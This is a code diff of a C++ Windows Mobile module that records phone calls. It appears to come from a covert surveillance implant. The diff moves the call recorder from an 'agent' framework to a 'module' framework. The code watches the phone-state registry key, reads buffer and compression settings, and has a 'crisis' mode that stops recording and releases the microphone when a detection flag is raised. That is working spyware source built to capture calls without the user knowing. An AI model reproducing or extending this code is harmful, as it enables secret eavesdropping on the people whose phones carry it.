@@ -1,6 +1,7 @@
+#include "Modules.h"
 #include "Common.h"
+#include "Module.h"
 #include "Conf.h"
-#include "Agents.h"
 #include <exception>
 #include <regext.h>
 
@@ -301,7 +302,9 @@ BOOL RecordStart()
 }
 
 DWORD WINAPI RecordedCalls(LPVOID lpParam) {
-	AGENT_COMMON_DATA(AGENT_CALL_LOCAL);
+	Module *me = (Module *)lpParam;
+	Configuration *conf = me->getConf();
+	HANDLE eventHandle;
 
 	HKEY hPhoneState;
 	DWORD dwType = 0;
@@ -309,8 +312,26 @@ DWORD WINAPI RecordedCalls(LPVOID lpParam) {
 	DWORD cbData = 0;
 	BOOL bCallStatus = FALSE, bCrisis = FALSE, bPrevState = FALSE;
 	Device *deviceObj = Device::self();
+	Status *statusObj = Status::self();
 	HREGNOTIFY hNotify;
 	HRESULT hRes;
+
+	try {
+		local_call_buffer_len = (DWORD)conf->getInt(L"buffer");
+	} catch (...) {
+		local_call_buffer_len = 524288;
+	}
+
+	try {
+		local_call_compress_factor = (DWORD)conf->getInt(L"compression");
+	} catch (...) {
+		local_call_compress_factor = 5;
+	}
+
+	me->setStatus(MODULE_RUNNING);
+	eventHandle = me->getEvent();
+
+	DBG_TRACE(L"Debug - RecordedCalls.cpp - Call Module started\n", 5, FALSE);
 
 	bLocalCallIsrecording = FALSE;
 	callObj = NULL;
@@ -320,18 +341,9 @@ DWORD WINAPI RecordedCalls(LPVOID lpParam) {
 	ZeroMemory(LocalCallerString, sizeof(LocalCallerString));
 	ZeroMemory(szName, sizeof(szName));
 
-	if (lpParam == NULL || statusObj == NULL || deviceObj == NULL) {
-		statusObj->ThreadAgentStopped(MyID);
-		return TRUE;
-	}
-
-	// Inizializziamo i parametri di configurazione
-	CopyMemory(&local_call_buffer_len, MyData->pParams, sizeof(UINT));
-	CopyMemory(&local_call_compress_factor, ((BYTE *)MyData->pParams + sizeof(UINT)), sizeof(UINT));
-
 	if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, L"System\\State\\Phone", 0, 0, &hPhoneState) != ERROR_SUCCESS) {
-		statusObj->ThreadAgentStopped(MyID);
-		return TRUE;
+		me->setStatus(MODULE_STOPPED);
+		return 0;
 	}
 
 	// Se la chiamata e' gia' in corso la callback non verra' notificata, quindi checkiamo da noi il valore
@@ -346,16 +358,20 @@ DWORD WINAPI RecordedCalls(LPVOID lpParam) {
 									(DWORD)&bCallStatus, NULL, &hNotify);
 
 	if (hRes != S_OK) {
-		statusObj->ThreadAgentStopped(MyID);
-		return TRUE;
+		me->setStatus(MODULE_STOPPED);
+		return 0;
 	}
 
-	statusObj->AgentAlive(MyID);
-	DBG_TRACE(L"Debug - RecordedCalls.cpp - RecordedCallsAgent started\n", 5, FALSE);
-
 	LOOP {
+		// Valorizziamo il flag di crisi
+		if ((statusObj->Crisis() & CRISIS_CALL) == CRISIS_CALL) {
+			bCrisis = TRUE;
+		} else {
+			bCrisis = FALSE;
+		}
+
 		while (bCrisis) {
-			DBG_TRACE(L"Debug - RecordedCalls.cpp - RecordedCallsAgent is in crisis\n", 6, FALSE);
+			DBG_TRACE(L"Debug - RecordedCalls.cpp - Call Module is in crisis\n", 6, FALSE);
 
 			if (bCallStatus) {
 				bCallStatus = FALSE;
@@ -364,11 +380,14 @@ DWORD WINAPI RecordedCalls(LPVOID lpParam) {
 				deviceObj->ReleaseMicPowerState();
 			}
 
-			if (AgentSleep(MyID, 5000)) {
+			WaitForSingleObject(eventHandle, 10000);
+
+			if (me->shouldStop()) {
+				DBG_TRACE(L"Debug - Microphone.cpp - Microphone Module clean stop while in crisis [0]\n", 5, FALSE);
 				RegistryCloseNotification(hNotify);
 				RegCloseKey(hPhoneState);
-				statusObj->ThreadAgentStopped(MyID);
-				DBG_TRACE(L"Debug - RecordedCalls.cpp - RecordedCallsAgent clean stop while in crisis [0]\n", 5, FALSE);
+				me->setStatus(MODULE_STOPPED);
+				return 0;
 			}
 
 			if ((statusObj->Crisis() & CRISIS_CALL) != CRISIS_CALL) {
@@ -400,14 +419,9 @@ DWORD WINAPI RecordedCalls(LPVOID lpParam) {
 			}
 		}
 
-		// Valorizziamo il flag di crisi
-		if ((statusObj->Crisis() & CRISIS_CALL) == CRISIS_CALL) {
-			bCrisis = TRUE;
-		} else {
-			bCrisis = FALSE;
-		}
+		WaitForSingleObject(eventHandle, 10000);
 
-		if (statusObj->AgentQueryStop(MyID)) {
+		if (me->shouldStop()) {
 			if (bCallStatus) {
 				RecordStop(FALSE);
 				ZeroMemory(LocalCallPhoneNumber, sizeof(LocalCallPhoneNumber));
@@ -417,14 +431,11 @@ DWORD WINAPI RecordedCalls(LPVOID lpParam) {
 			RegistryCloseNotification(hNotify);
 			RegCloseKey(hPhoneState);
 
-			statusObj->ThreadAgentStopped(MyID);
-			DBG_TRACE(L"Debug - RecordedCalls.cpp - RecordedCallsAgent clean stop\n", 5, FALSE);
-			return TRUE;
+			me->setStatus(MODULE_STOPPED);
+			DBG_TRACE(L"Debug - RecordedCalls.cpp - Call Module clean stop\n", 5, FALSE);
+			return 0;
 		}
-
-		Sleep(1000);
 	}
 
-	statusObj->ThreadAgentStopped(MyID);
 	return 0;
 }
